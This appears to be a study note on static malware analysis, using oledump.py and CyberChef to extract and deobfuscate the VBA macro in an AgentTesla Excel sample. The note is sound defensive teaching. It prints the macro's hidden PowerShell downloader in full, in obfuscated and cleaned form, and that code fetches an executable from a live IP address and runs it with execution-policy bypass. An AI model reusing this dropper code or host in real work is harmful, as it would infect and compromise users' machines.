The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

---
# File Analysis

we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document. 

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding,** a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.


### Analyzing Malicious Documents with Oledump.py

#### 1. The Tool: Oledump.py

**Purpose:** A Python tool for analyzing **OLE2 files** (Compound File Binary Format).

**OLE (Object Linking and Embedding):** A Microsoft technology used in files like Office documents (`.doc`, `.xls`, `.ppt`) to store multiple data streams within a single file.

**Use Case:** Essential for forensic analysis and malware detection, particularly for extracting and examining embedded content like VBA macros.

#### 2. Basic Analysis Workflow (Example: AgentTesla)

**Step 1: Scan the File**

**Command:** 

```
oledump.py <filename>
```

**Example:** `oledump.py agenttesla.xlsm`

**Output:** Lists the data streams inside the OLE file.

- **Key Indicator:** A capital **`M`** next to a stream indicates the presence of a **Macro**.

- **Target:** `A4: M 688 'VBA/ThisWorkbook'` is identified as the stream of interest.

![[Pasted image 20260221010657.png]]

**Step 2: Select the Data Stream**

**Command:** 
```
oledump.py <filename> -s <stream_number>
```

**Example:** 
```
oledump.py agenttesla.xlsm -s 4
```

![[Pasted image 20260221011122.png]]

**Output:** Displays the raw content of the selected stream in hex dump format.

**Step 3: Decompress the VBA Macro**

**Command:** Add `--vbadecompress` to the previous command.

**Example:** 
```
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

![[Pasted image 20260221011312.png]]

**Output:** Decompresses the VBA code, making it human-readable.
This reveals the actual malicious script logic.
#### 3. Case Study: Deobfuscating an AgentTesla Payload

**A. The Obfuscated Script**

The decompressed VBA reveals a variable `Sqtnew` containing a PowerShell command with obfuscation characters (`*` and `^`).
The script then defines functions to clean these characters:
- `Replace(Sqtnew, "*", "")` (Remove all asterisks)
- `Replace(Sqtnew, "^", "")` (Remove all carets)

```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```


**B. Deobfuscation with CyberChef**

1.**Input:** Paste the obfuscated string from `Sqtnew` into CyberChef.

2.**Operation 1:** Use **Find/Replace**.

- _Find:_ `*` (as a SIMPLE STRING)    
- _Replace:_ (leave blank)

3.**Operation 2:** Add another **Find/Replace**.

- _Find:_ `^` (as a SIMPLE STRING)        
- _Replace:_ (leave blank)

4.**Output:** The cleaned, readable PowerShell script.

![[Pasted image 20260221011812.png]]

```
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

**C. The Final Payload Explained**  
The cleaned script reveals a classic malware downloader pattern:

1.**Execution Evasion:**

- `-WindowStyle hidden`: Runs PowerShell without showing a window to the user.    

- `-executionpolicy bypass`: Overrides Windows' default security policy to allow any script to run.

2.**Download:**

- `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile`

- Downloads a file from the remote server. Note the file is named with a `.pdf` extension to appear harmless, but is saved as an `.exe`.

3.**Execution:**

- `Start-Process $TempFile`

- Runs the downloaded executable, completing the infection chain.


#### 4. Summary of the Attack Chain

1.**User Action:** Victim opens the `agenttesla.xlsm` file.

2.**Auto-execution:** The embedded Macro runs automatically.

3.**Payload Staging:** The VBA script builds and executes a hidden, bypassed PowerShell command.

4.**Malware Drop:** PowerShell downloads `Doc-3737122pdf.exe` from a remote C2 server.

5.**Infection:** PowerShell executes the downloaded malware (AgentTesla).
